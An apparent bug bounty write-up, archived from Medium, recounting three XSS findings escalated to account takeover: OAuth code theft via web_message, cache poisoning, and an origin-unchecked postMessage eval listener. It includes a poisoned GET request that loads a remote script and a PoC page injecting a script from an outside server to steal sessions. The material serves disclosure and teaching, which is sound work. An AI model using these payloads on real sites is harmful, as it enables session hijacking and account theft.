# Weaponizing XSS for Maximum Impact

- **Source URL:** https://medium.com/@ryuku_dz/weaponizing-xss-for-maximum-impact-0aa84b17ad60?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250905111336/https://medium.com/@ryuku_dz/weaponizing-xss-for-maximum-impact-0aa84b17ad60
- **Fetched:** 2026-11-21
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/9826 (id 9826)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Weaponizing XSS for Maximum Impact

Peace be upon you! I go by [Ryuku](https://bugcrowd.com/ryuku) and I’m a *part-time* bounty hunter. While reviewing my stats recently, I noticed something interesting. the bug class I report the most is **XSS (Cross-Site Scripting)**.

This didn’t surprise me, I’ve always been particularly interested in client-side vulnerabilities.

In this post, I’ll walk you through **some** of the recent account takeovers I’ve reported. I’ll show you where to look once you’ve found an XSS and how to **maximize** its impact to escalate the severity and hopefully earn higher **bounties**.

## Defining Maximum Impact

**impact** refers to the potential consequences or damage that a vulnerability can cause if exploited.

For client-side findings, the highest possible impact is **account takeover**. The methods to achieve this vary depending on the target’s architecture.

So before you hit that “Submit Report” button, always **ask** yourself: *Can I take this further? Can I turn this into full account compromise?*

## Case Study 1: Stealing Oauth tokens via XSS leads to Account Takeover

The target here is a popular cryptocurrency exchange, A friend of mine was [fuzzing](https://owasp.org/www-community/Fuzzing) parameters and discovered a **hidden** one named`_method`. As the name suggests, it was being used to **override** the [HTTP method](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods). When sending a non-standard or unsupported HTTP method, the server would reflect it back in the response without any sanitization.

The target was behind Akamai, but bypassing their [WAF](https://www.akamai.com/glossary/what-is-a-waf) was relatively easy. However, I then ran into another obstacle: all input was being automatically converted to uppercase. This was problematic because JavaScript functions are case-sensitive. for example, `IMPORT()` won’t work since it must be `import()`.

I overcame this limitation by using [HTML entities](https://mothereff.in/html-entities) to **bypass** the case enforcement.

`hello, world! -> hello, world!`
Now that I confirmed I can execute code, I started looking for a gadget that could help us demonstrate the impact.

I kept digging until I found that the target’s OAuth flow supports the [web\_message](https://www.ietf.org/archive/id/draft-meyerzuselha-oauth-web-message-response-mode-00.html) response mode. It will send the OAuth code to the [opener](https://developer.mozilla.org/en-US/docs/Web/API/Window/opener), as long as the opener’s root domain matches the target domain.

The attack flow was as follows:

1. Attacker **sends** the victim a link to the vulnerable endpoint.
2. The victim **clicks** the link, which triggers a login prompt on `login.target.com` (the legitimate login page).
3. The victim **logs in**.
4. The OAuth authorization code is **sent** to`xss.target.com`, where the attacker has injected JavaScript code that includes a [message](https://developer.mozilla.org/en-US/docs/Web/API/Window/message_event) listener to **capture** the OAuth authorization code.
5. The attacker uses the stolen authorization code to obtain the OAuth access token.
6. The attacker gains the victim’s session, **fully compromising** the victim’s account.

Below, this **rough** drawing partially explains the process…

Below a screenshot from the report to help clarify your understanding:

The program assigned a severity level of **high** (8.2) and paid $5,000.

## Case Study 2: Chaining XSS and Cache Poisoning for Zero-Click Account Takeover

[**Web cache poisoning**](https://portswigger.net/web-security/web-cache-poisoning) is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users.

In this case, we **poison** the response with malicious JavaScript, allowing us to exploit users without any interaction on their part.

This time, the target is a popular athletic apparel company. There is a functionality that provides users with the ability to compare products, and it takes `url` parameter and inserts it into the `href` attribute of an anchor element without any validation, allowing the use of the `javascript:` [scheme](https://developer.mozilla.org/en-US/docs/Web/URI/Reference/Schemes/javascript).

Additionally, the `label` parameter directly sets the `textContent` of the anchor tag, making it easier to persuade users to click.

So, we send an HTTP request:

```
GET /products?url=javascript:import(%22https://cdn.jsdelivr.net/gh/itsryuku/jsdlvr/poc.js%22)&label=BUGCROWD%20POC!%20CLICK%20FOR%2050%25%20OFF%20EVERYTHING!! HTTP/1.1
Host: redacted.com
```
We find our payload in the response, and then the cache does the rest for us making it available to anyone browsing `/products`, with the payload embedded there.

The parameters were not included in the [cache key](https://developers.cloudflare.com/cache/how-to/cache-keys/), so the cache would return my **poisoned** response even if the values did not match.

I was lucky enough to find out that the session cookie was not [HttpOnly](https://owasp.org/www-community/HttpOnly); hence, it was accessible to JavaScript.

Here’s an explanation of how I stole the session:

I believe this should be classified as **critical**, but it was marked as **High** and **paid** $2,000.

## Case Study 3: XSS via postMessage leads to Account Takeover

The [postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) API enables safe **cross-origin** communication between browsing contexts such as iframes, popups, or tabs. It’s commonly used to **exchange data** between a page and a popup it spawned, or between a page and an embedded iframe.

Improper use of `postMessage` can result in **vulnerabilities** such as XSS and information disclosure. We will walk through a case that led to an account takeover using XSS

When visiting the target’s homepage, [postMessage-tracker](https://github.com/fransr/postMessage-tracker) notified me that there was a [message](https://developer.mozilla.org/en-US/docs/Web/API/Window/message_event) listener on the page. I opened the developer tools to inspect it and found that the code was [**obfuscated**](https://www.techtarget.com/searchsecurity/definition/obfuscation).

```
window[_0x15ee85(447)](
    "message",
    function (_0x678474) {
        var _0x35134a = _0x15ee85;
        try {
            if (void 0 === _0x678474[_0x35134a(444)]) return;
            if (null === _0x678474[_0x35134a(444)]) return;
            if (void 0 === _0x678474[_0x35134a(444)][_0x35134a(231)]) return;
            if (void 0 === _0x678474[_0x35134a(444)][_0x35134a(649)]) return;
            if (_0x678474[_0x35134a(444)][_0x35134a(231)] !== _0x35134a(251))
                return;
            eval(_0x678474[_0x35134a(444)][_0x35134a(649)]);
        } catch (a) {}
    },
    !1
);
```
Although there are many ways and tools to deobfuscate code, since it was relatively short, I decided to perform **dynamic** deobfuscation. Within a few minutes, I understood that the listener **expects** two important properties: `eval` and `target`. The code does not check the sender’s **origin** and directly passes the received `eval` property to the notorious `eval()` function, leading to JavaScript execution.

The target had an [endpoint](https://blog.postman.com/what-is-an-api-endpoint/) `/account/oauth/token` that returned the access token within the **response body**. So, I used the XSS to [fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch) that endpoint with credentials, resulting in an easy session hijacking.

PoC:

```
<body>
    <button id="target">PoC</button>
    <script>
        document
            .querySelector("#target")
            .addEventListener("click", function () {
                // Open the vulnerable page
                const win = window.open("https://redacted.com/");
                
                // Define the malicious message that will trigger the XSS
                // This code injects an external script that handles session theft
                const payload = {
                    eval: "s=document.createElement('script');s.src='https://myserver.com/poc.js';document.body.appendChild(s)",
                    target: "framework",
                };
                // Send the message once loaded
                setTimeout(() => win.postMessage(payload, "*"), 4000);
            });
    </script>
</body>
```
The program **paid** $1,194.04 and sent an encouraging message.

postMessage vulnerabilities are some of my favorites. I’ll be publishing a post soon where I talk about **how** to find and **exploit** them, along with a walk-through of my best postMessage **submissions**!

## Bonus: It’s raining 🌧️XSS

While writing this blog, I **found** another XSS that led to an account takeover. It was quite exciting because I had to **bypass** some decent checks!

I’ll leave you with the raw report, with the target’s information redacted as usual to respect their privacy.

*P.S. The report has been triaged. I’ll update it once a bounty has been awarded.*

**Final Takeaway:**

XSS remains the most common and widely reported vulnerability on [HackerOne](https://www.hackerone.com/lp/top-ten-vulnerabilities), making it a staple in every bug hunter’s toolkit. But since everyone knows how to find the obvious XSS flaws, standing out requires digging deeper — master the edge cases, understand exploitation nuances, and think **beyond** the basics. Always aim higher by targeting account takeover (ATO) scenarios to deliver truly impactful and unique findings. That’s how you level up from just another XSS report to a game-changing vulnerability.

To **learn** more about XSS, check out the **resources** below. Until next time!

- [PortSwigger labs](https://portswigger.net/web-security/cross-site-scripting)
- [Beyond XSS](https://aszx87410.github.io/beyond-xss/en/)
- [JavaScript for hackers](https://www.amazon.co.uk/JavaScript-hackers-Learn-think-hacker/dp/B0BRD9B3GS)
- [Web Application Obfuscation: -/WAFs..Evasion..Filters//alert(/Obfuscation/)-’](https://www.amazon.co.uk/Web-Application-Obfuscation-Evasion-Filters/dp/1597496049)

— ryuku
